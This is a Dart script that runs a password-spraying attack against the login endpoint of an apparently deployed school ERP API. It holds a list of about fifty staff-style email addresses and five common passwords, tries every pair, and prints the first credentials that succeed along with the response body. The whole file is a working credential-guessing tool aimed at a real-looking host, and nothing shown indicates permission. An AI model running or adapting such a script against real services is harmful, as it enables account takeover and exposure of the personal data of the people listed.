import 'dart:convert';
import 'package:http/http.dart' as http;

void main() async {
  final base = 'https://edusphere-erp.onrender.com/api/v1';
  final emails = [
    "edusphereteacher@gmail.com",
    "priya.joshi@edusphere.edu",
    "aanya.verma@edusphere.edu",
    "vijay.wilson@edusphere.edu",
    "dev.thomas@edusphere.edu",
    "amit.khan@edusphere.edu",
    "sai.iyengar@edusphere.edu",
    "diya.pillai@edusphere.edu",
    "aryan.khan@edusphere.edu",
    "amit.mukherjee@edusphere.edu",
    "sanjay.gupta@edusphere.edu",
    "vijay.chauhan@edusphere.edu",
    "aryan.kapoor@edusphere.edu",
    "rahul.das@edusphere.edu",
    "prisha.gupta@edusphere.edu",
    "anjali.kumar@edusphere.edu",
    "kabir.sharma@edusphere.edu",
    "anjali.kumar1@edusphere.edu",
    "riya.khan@edusphere.edu",
    "rahul.pillai@edusphere.edu",
    "kabir.joshi@edusphere.edu",
    "ishita.chauhan@edusphere.edu",
    "myra.wilson@edusphere.edu",
    "rohan.bose@edusphere.edu",
    "aadhya.chauhan@edusphere.edu",
    "kiara.sharma@edusphere.edu",
    "rahul.rao@edusphere.edu",
    "aanya.kumar@edusphere.edu",
    "vivaan.kumar@edusphere.edu",
    "prisha.iyengar@edusphere.edu",
    "rohan.verma@edusphere.edu",
    "tanvi.das@edusphere.edu",
    "reyansh.kapoor@edusphere.edu",
    "divya.chauhan@edusphere.edu",
    "amit.singh@edusphere.edu",
    "ira.dasgupta@edusphere.edu",
    "atharv.iyengar@edusphere.edu",
    "sanjay.das@edusphere.edu",
    "dev.bose@edusphere.edu",
    "ananya.verma@edusphere.edu",
    "geeta.iyengar@edusphere.edu",
    "riya.kumar@edusphere.edu",
    "pooja.singh@edusphere.edu",
    "divya.khan@edusphere.edu",
    "kiara.yadav@edusphere.edu",
    "vijay.nair@edusphere.edu",
    "ishita.thomas@edusphere.edu",
    "riya.thomas@edusphere.edu",
    "pooja.chatterjee@edusphere.edu",
    "pooja.malhotra@edusphere.edu",
    "ira.das@edusphere.edu"
  ];

  final passwords = [
    "edusphere",
    "Teacher@123",
    "Teacher@2024",
    "teacher123",
    "password"
  ];

  for (var email in emails) {
    for (var pass in passwords) {
      try {
        final response = await http.post(
          Uri.parse('$base/auth/login'),
          headers: {'Content-Type': 'application/json'},
          body: jsonEncode({
            'email': email,
            'password': pass,
          }),
        );
        if (response.statusCode == 200) {
          print('🎉 SUCCESS: $email / $pass');
          print('Body: ${response.body}');
          return;
        }
      } catch (e) {
        // ignore
      }
    }
  }
  print('All combinations failed.');
}
